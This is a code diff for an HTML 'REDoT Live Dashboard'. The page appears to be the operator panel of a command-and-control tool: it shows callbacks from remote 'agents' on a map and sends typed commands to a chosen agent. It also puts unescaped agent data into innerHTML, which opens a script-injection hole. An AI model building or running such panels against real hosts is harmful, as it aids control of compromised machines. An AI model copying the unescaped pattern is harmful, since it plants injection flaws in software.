@@ -1,3 +1,4 @@
+<!-- webgui/dashboard.html -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -5,9 +6,13 @@
   <title>REDoT Live Dashboard</title>
   <style>
     body { font-family: monospace; background: #111; color: #0f0; margin: 0; padding: 0; }
+    h2 { background: #222; margin: 0; padding: 10px; color: #39ff14; }
     #map { height: 40vh; }
     #console { padding: 10px; height: 40vh; overflow-y: scroll; background: #000; }
-    #cmdInput { width: 80%; }
+    form { background: #111; padding: 10px; border-top: 1px solid #333; display: flex; gap: 10px; }
+    input, button { font-family: monospace; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; }
+    #cmdInput { flex: 1; }
+    #agentId { width: 200px; }
   </style>
   <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
 </head>
@@ -34,23 +39,38 @@
 
     ws.onmessage = function(event) {
       let data = JSON.parse(event.data);
-      let log = `[${data.timestamp || new Date().toISOString()}] ${data.agent || "unknown"}: ${data.msg || "callback"}`;
+      let ts = data.timestamp || new Date().toISOString();
+      let agent = data.agent || "unknown";
+      let msg = data.msg || "callback received";
+      let log = `[${ts}] ${agent}: ${msg}`;
       consoleDiv.innerHTML += log + "<br>";
       consoleDiv.scrollTop = consoleDiv.scrollHeight;
 
       if (data.lat && data.lon && data.agent) {
-        if (agentMarkers[data.agent]) map.removeLayer(agentMarkers[data.agent]);
-        agentMarkers[data.agent] = L.marker([data.lat, data.lon]).addTo(map).bindPopup(data.agent);
+        if (agentMarkers[data.agent]) {
+          map.removeLayer(agentMarkers[data.agent]);
+        }
+        agentMarkers[data.agent] = L.marker([data.lat, data.lon])
+          .addTo(map)
+          .bindPopup(`${data.agent}<br>${msg}`)
+          .openPopup();
       }
     };
 
     function sendCommand() {
+      const agent = document.getElementById("agentId").value;
+      const cmd = document.getElementById("cmdInput").value;
       fetch("/send", {
         method: "POST",
-        body: new URLSearchParams({
-          agent: document.getElementById("agentId").value,
-          cmd: document.getElementById("cmdInput").value
-        })
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({ agent, cmd })
+      }).then(resp => {
+        if (resp.status === 200) {
+          consoleDiv.innerHTML += `[+] Sent to ${agent}: ${cmd}<br>`;
+        } else {
+          consoleDiv.innerHTML += `[!] Failed to send command.<br>`;
+        }
+        consoleDiv.scrollTop = consoleDiv.scrollHeight;
       });
     }
   </script>
